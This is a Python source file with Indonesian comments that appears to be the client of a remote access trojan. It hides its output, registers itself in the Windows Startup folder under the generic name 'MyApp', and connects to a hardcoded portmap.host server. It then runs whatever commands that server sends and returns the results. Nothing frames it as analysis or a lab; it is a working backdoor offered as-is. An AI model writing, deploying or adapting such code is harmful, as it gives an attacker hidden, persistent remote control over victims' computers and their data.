#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modul
import Core.server as Server
import Core.commands as Command
import sys
import time
from os import system, name, devnull
from pathlib import Path
import os
import shutil
import winreg

# Mengalihkan keluaran stdout dan stderr ke /dev/null untuk menekan pesan log
sys.stdout = open(devnull, 'w')
sys.stderr = open(devnull, 'w')

# Mengubah encoding default jika dijalankan di Windows
if name == "nt":
    system("chcp 65001 > " + devnull)

# Pengaturan server default
SERVER_HOST = "rasep59-52984.portmap.host"
SERVER_PORT = 52984

# Fungsi untuk membangun koneksi dengan logika pengulangan
def connect_with_retry(host, port, retries=5, delay=5):
    for attempt in range(retries):
        try:
            server = Server.ConnectServer(host, port)
            return server
        except Exception as e:
            print(f"[Error] Gagal menghubungkan ke server di {host}:{port}, percobaan ke-{attempt + 1}: {e}")
            time.sleep(delay)
    print(f"[Error] Gagal menghubungkan ke server di {host}:{port} setelah {retries} percobaan.")
    return None

# Fungsi untuk menambahkan aplikasi ke startup Windows
def add_to_startup(file_path=None, shortcut_name='MyApp'):
    """ Menambahkan aplikasi ke startup Windows. """
    if file_path is None:
        file_path = sys.executable

    # Menentukan path direktori startup
    startup_dir = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    shortcut_path = startup_dir / f'{shortcut_name}.lnk'

    # Membuat shortcut jika tidak ada
    if not shortcut_path.exists():
        try:
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.Targetpath = file_path
            shortcut.WorkingDirectory = str(Path(file_path).parent)
            shortcut.save()
            print(f"Shortcut dibuat: {shortcut_path}")
        except Exception as e:
            print(f"[Error] Gagal membuat shortcut: {e}")

# Eksekusi utama dimulai di sini
if __name__ == '__main__':
    # Menambahkan ke startup pada saat pertama kali dijalankan atau sesuai kebutuhan
    try:
        add_to_startup()
    except Exception as e:
        print(f"[Error] Gagal menambahkan aplikasi ke startup: {e}")

    # Menghubungkan ke server dengan logika pengulangan
    server = None
    try:
        server = connect_with_retry(SERVER_HOST, SERVER_PORT)
        if server is None:
            print("[Error] Tidak dapat terhubung ke server. Aplikasi akan berhenti.")
            sys.exit(1)
    except Exception as e:
        print(f"[Error] Kesalahan saat menghubungkan ke server: {e}")
        sys.exit(1)

    command = ""
    while command.lower() != "exit":
        try:
            # Menerima perintah dari server
            command = server.Read()
            # Menjalankan perintah
            output = Command.Run(command, server)
            # Mengirimkan respons perintah
            server.Send(output)
        except Exception as e:
            print(f"[Error] Kesalahan selama komunikasi: {e}")
            continue

    # Menutup koneksi
    try:
        server.Disconnect()
    except Exception as e:
        print(f"[Error] Gagal menutup koneksi: {e}")
